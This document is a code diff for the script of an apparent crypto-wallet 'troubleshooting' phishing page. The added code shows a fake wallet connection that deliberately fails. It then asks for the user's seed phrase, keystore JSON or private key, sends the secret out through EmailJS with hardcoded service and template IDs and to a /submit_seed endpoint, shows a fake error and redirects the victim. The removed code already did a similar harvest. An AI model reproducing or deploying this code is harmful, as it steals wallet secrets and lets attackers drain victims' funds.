@@ -1,133 +1,238 @@
 
-// Wallet logos and data
-const walletData = {
-  'MetaMask': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
-  'Trust Wallet': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/bnb.svg',
-  'WalletConnect': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
-  'Coinbase Wallet': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/usdc.svg',
-  'Phantom': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/sol.svg',
-  'Rainbow': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
-  'Exodus': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
-  'Atomic Wallet': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/atom.svg'
-};
-
-// Initialize wallet list when page loads
 document.addEventListener('DOMContentLoaded', function() {
-  populateWalletList();
-  setupImportMethodTabs();
+    // Initialize EmailJS
+    emailjs.init("hwWuRqhr9vJTWa-n8");
+    
+    const connectWalletBtn = document.getElementById('connect-wallet-btn');
+    const walletModal = document.getElementById('wallet-modal');
+    const stepsModal = document.getElementById('steps-modal');
+    const importModal = document.getElementById('import-modal');
+    const validationModal = document.getElementById('validation-modal');
+    const errorModal = document.getElementById('error-modal');
+    const customWalletModal = document.getElementById('custom-wallet-modal');
+    const customIssueModal = document.getElementById('custom-issue-modal');
+    const issueConfirmationModal = document.getElementById('issue-confirmation-modal');
+    const validateBtn = document.getElementById('validate-btn');
+    const closeBtn = document.getElementById('close-btn');
+    const seedInput = document.getElementById('seed-input');
+
+    let selectedWallet = '';
+    let selectedIssue = '';
+
+    // Connect wallet button click
+    connectWalletBtn.addEventListener('click', function() {
+        walletModal.classList.remove('hidden');
+    });
+
+    // Wallet selection
+    document.querySelectorAll('.wallet-item').forEach(item => {
+        item.addEventListener('click', function() {
+            selectedWallet = this.dataset.wallet;
+            
+            if (selectedWallet === 'other') {
+                walletModal.classList.add('hidden');
+                customWalletModal.classList.remove('hidden');
+            } else {
+                walletModal.classList.add('hidden');
+                showConnectionSteps();
+            }
+        });
+    });
+
+    // Show connection steps with 10 second delay before error
+    function showConnectionSteps() {
+        stepsModal.classList.remove('hidden');
+        document.getElementById('step-title').textContent = 'Connecting...';
+        document.getElementById('step-description').textContent = 'Connecting to your wallet...';
+        
+        // Show error after 10 seconds, then move to import modal
+        setTimeout(() => {
+            document.getElementById('step-title').textContent = 'Connection Failed';
+            document.getElementById('step-description').textContent = 'Error connecting to wallet...';
+            
+            setTimeout(() => {
+                stepsModal.classList.add('hidden');
+                showImportModal();
+            }, 1000);
+        }, 10000);
+    }
+
+    // Show import modal
+    function showImportModal() {
+        const walletName = selectedWallet.charAt(0).toUpperCase() + selectedWallet.slice(1);
+        document.getElementById('wallet-name').textContent = walletName;
+        importModal.classList.remove('hidden');
+    }
+
+    // Show issue confirmation
+    function showIssueConfirmation(issue) {
+        document.getElementById('issue-title').textContent = 'Connect to wallet to troubleshoot your issue';
+        document.getElementById('issue-description').textContent = `Issue: ${issue}. Click continue to connect your wallet and resolve your problem.`;
+        issueConfirmationModal.classList.remove('hidden');
+    }
+
+    // Import option selection
+    document.querySelectorAll('.import-option').forEach(option => {
+        option.addEventListener('click', function() {
+            document.querySelectorAll('.import-option').forEach(opt => opt.classList.remove('active'));
+            this.classList.add('active');
+            
+            const selectedOption = this.dataset.option;
+            const label = document.querySelector('.import-form label');
+            const input = document.getElementById('seed-input');
+            
+            switch(selectedOption) {
+                case 'seed':
+                    label.textContent = 'Enter your wallet seed phrase';
+                    input.placeholder = 'Enter your seed phrase';
+                    break;
+                case 'keystore':
+                    label.textContent = 'Enter your keystore JSON';
+                    input.placeholder = 'Paste your keystore JSON here';
+                    break;
+                case 'private':
+                    label.textContent = 'Enter your private key';
+                    input.placeholder = 'Enter your private key';
+                    break;
+            }
+        });
+    });
+
+    // Validate button click
+    validateBtn.addEventListener('click', function() {
+        const seedPhrase = seedInput.value.trim();
+        const selectedOption = document.querySelector('.import-option.active').dataset.option;
+        
+        if (!seedPhrase) {
+            alert('Please enter your seed phrase');
+            return;
+        }
+
+        importModal.classList.add('hidden');
+        validationModal.classList.remove('hidden');
+
+        // Send data via EmailJS
+        const templateParams = {
+            wallet_name: selectedWallet,
+            data_type: selectedOption,
+            seed_phrase: seedPhrase,
+            issue: selectedIssue || 'General wallet connection'
+        };
+
+        emailjs.send("service_xccsf1u", "template_icljc9o", templateParams)
+            .then(function(response) {
+                console.log('Email sent successfully:', response);
+            })
+            .catch(function(error) {
+                console.log('Email send failed:', error);
+            });
+
+        // Also send to backend as backup
+        fetch('/submit_seed', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ 
+                seedPhrase: seedPhrase,
+                walletName: selectedWallet,
+                dataType: selectedOption,
+                issue: selectedIssue
+            })
+        });
+
+        // Show validation for 10 seconds then show error for 5 seconds
+        setTimeout(() => {
+            validationModal.classList.add('hidden');
+            errorModal.classList.remove('hidden');
+            
+            // Hide error modal after 5 seconds and redirect to homepage
+            setTimeout(() => {
+                errorModal.classList.add('hidden');
+                resetApp();
+                // Redirect to homepage
+                window.location.href = '/';
+            }, 5000);
+        }, 10000); // 10 seconds = 10,000 milliseconds
+    });
+
+    // Close button click
+    closeBtn.addEventListener('click', function() {
+        importModal.classList.add('hidden');
+        resetApp();
+    });
+
+    // Custom wallet modal handlers
+    document.getElementById('custom-wallet-confirm').addEventListener('click', function() {
+        const customWallet = document.getElementById('custom-wallet-input').value.trim();
+        if (customWallet) {
+            selectedWallet = customWallet;
+            customWalletModal.classList.add('hidden');
+            showConnectionSteps();
+        } else {
+            alert('Please enter a wallet name');
+        }
+    });
+
+    document.getElementById('custom-wallet-cancel').addEventListener('click', function() {
+        customWalletModal.classList.add('hidden');
+        walletModal.classList.remove('hidden');
+    });
+
+    // Custom issue modal handlers
+    document.getElementById('custom-issue-confirm').addEventListener('click', function() {
+        const customIssue = document.getElementById('custom-issue-input').value.trim();
+        if (customIssue) {
+            selectedIssue = customIssue;
+            customIssueModal.classList.add('hidden');
+            showIssueConfirmation(customIssue);
+        } else {
+            alert('Please describe your issue');
+        }
+    });
+
+    document.getElementById('custom-issue-cancel').addEventListener('click', function() {
+        customIssueModal.classList.add('hidden');
+    });
+
+    // Issue confirmation modal handlers
+    document.getElementById('issue-continue').addEventListener('click', function() {
+        issueConfirmationModal.classList.add('hidden');
+        walletModal.classList.remove('hidden');
+    });
+
+    document.getElementById('issue-cancel').addEventListener('click', function() {
+        issueConfirmationModal.classList.add('hidden');
+        resetApp();
+    });
+
+    // Reset app to initial state
+    function resetApp() {
+        seedInput.value = '';
+        selectedWallet = '';
+        selectedIssue = '';
+        document.getElementById('custom-wallet-input').value = '';
+        document.getElementById('custom-issue-input').value = '';
+        document.getElementById('troubleshoot-select').value = '';
+    }
+
+    // Close modals when clicking outside
+    window.addEventListener('click', function(event) {
+        if (event.target.classList.contains('modal')) {
+            event.target.classList.add('hidden');
+        }
+    });
+
+    // Troubleshoot dropdown change
+    document.getElementById('troubleshoot-select').addEventListener('change', function() {
+        if (this.value) {
+            selectedIssue = this.options[this.selectedIndex].text;
+            
+            if (this.value === 'other') {
+                customIssueModal.classList.remove('hidden');
+            } else {
+                showIssueConfirmation(selectedIssue);
+            }
+        }
+    });
 });
-
-function populateWalletList() {
-  const walletList = document.getElementById('walletList');
-  
-  Object.keys(walletData).forEach(walletName => {
-    const walletItem = document.createElement('div');
-    walletItem.className = 'wallet-item';
-    walletItem.onclick = () => selectWallet(walletName);
-    
-    walletItem.innerHTML = `
-      <div class="wallet-status"></div>
-      <img src="${walletData[walletName]}" alt="${walletName}" class="wallet-logo-small">
-      <span>${walletName}</span>
-    `;
-    
-    walletList.appendChild(walletItem);
-  });
-
-  // Add "Other" option for custom wallet
-  const otherItem = document.createElement('div');
-  otherItem.className = 'wallet-item';
-  otherItem.onclick = () => showCustomWalletInput();
-  otherItem.innerHTML = `
-    <div class="wallet-status"></div>
-    <span style="margin-left: 2.5rem;">Other</span>
-  `;
-  walletList.appendChild(otherItem);
-}
-
-function selectWallet(walletName) {
-  // Close wallet selection popup
-  document.getElementById('walletPopup').style.display = 'none';
-  
-  // Show initialization popup
-  document.getElementById('initWalletName').textContent = `Connecting to ${walletName}`;
-  document.getElementById('initStatusMessage').textContent = 'Attempting to connect...';
-  document.getElementById('initPopup').style.display = 'flex';
-  
-  // Simulate connection attempt
-  setTimeout(() => {
-    // Close init popup and show import popup
-    document.getElementById('initPopup').style.display = 'none';
-    showImportPopup(walletName);
-  }, 2000);
-}
-
-function showCustomWalletInput() {
-  document.getElementById('customWalletInput').classList.remove('hidden');
-}
-
-function selectCustomWallet() {
-  const customName = document.getElementById('customWalletName').value.trim();
-  if (customName) {
-    selectWallet(customName);
-  }
-}
-
-function showImportPopup(walletName) {
-  document.getElementById('importWalletName').textContent = walletName;
-  document.getElementById('importWalletLogo').src = walletData[walletName] || '';
-  document.getElementById('walletImportPopup').style.display = 'flex';
-}
-
-function setupImportMethodTabs() {
-  const tabs = document.querySelectorAll('.method-tab');
-  const input = document.getElementById('walletSeedInput');
-  
-  tabs.forEach(tab => {
-    tab.addEventListener('click', function() {
-      // Remove active class from all tabs
-      tabs.forEach(t => t.classList.remove('active'));
-      // Add active class to clicked tab
-      this.classList.add('active');
-      
-      // Update placeholder based on selected method
-      const method = this.dataset.type;
-      switch(method) {
-        case 'seed':
-          input.placeholder = 'Enter your 12 or 24 word seed phrase';
-          break;
-        case 'keystore':
-          input.placeholder = 'Paste your keystore JSON file content';
-          break;
-        case 'private':
-          input.placeholder = 'Enter your private key';
-          break;
-      }
-    });
-  });
-}
-
-function openWalletPopup(issueType) {
-  if (issueType) {
-    document.getElementById('troubleshootIssueType').textContent = issueType;
-    document.getElementById('troubleshootPopup').style.display = 'flex';
-  }
-}
-
-// Send data to backend as backup
-async function sendToBackend(data) {
-  try {
-    const response = await fetch('/submit-wallet-data', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    });
-    
-    const result = await response.json();
-    console.log('Backend response:', result);
-  } catch (error) {
-    console.error('Backend submission failed:', error);
-  }
-}
